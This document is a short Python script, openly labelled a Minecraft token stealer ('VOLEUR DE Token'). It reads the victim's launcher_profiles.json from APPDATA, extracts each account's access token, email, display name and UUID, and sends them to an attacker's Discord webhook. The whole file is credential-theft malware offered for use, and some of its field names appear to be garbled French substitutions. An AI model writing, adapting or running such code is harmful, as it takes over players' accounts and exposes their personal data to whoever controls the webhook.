import discord_webhook

import json

import os



# configuration

WEBHOOK_URL = '<URL HERE>'



def uuid_dashed(uuid):

    return f'{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}'



if __name__ == '__main__':

    auth_db = json.loads(open(os.getenv('APPDATA') + '\\.minecraft\\launcher_profiles.json').read())['authenticationDatabase']



    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft VOLEUR DE Token ', avatar_url='http://www.rw-designer.com/icon-image/5547-256x256x32.png')

    

    for i, x in enumerate(auth_db):

        token = auth_db[x]['Acces au Token']

        email = auth_db[x].get('NOM')

        uuid, display_name_object = list(auth_db[x]['profiles'].items())[0]



        embed = discord_webhook.DiscordEmbed(color=0xFEFEFE)

        

        if i == 0:

            embed.set_author(name='Aller sur discord XD', url='https://discord.com', icon_url='https://github.com/fluidicon.png')

        elif i == len(auth_db) - 1:

            embed.set_footer(text='Developed by ALEXDIEU')



        embed.add_embed_field(name='Email', value=email if email and '@' in email else 'N/A', inline=False)



        embed.add_embed_field(name='NOM', value=display_name_object['displayNOM'])

        embed.add_embed_field(name='UUID', value=uuid_dashed(uuid))

        embed.add_embed_field(name='Son Token', value=token)



        webhook.add_embed(embed)



    webhook.execute()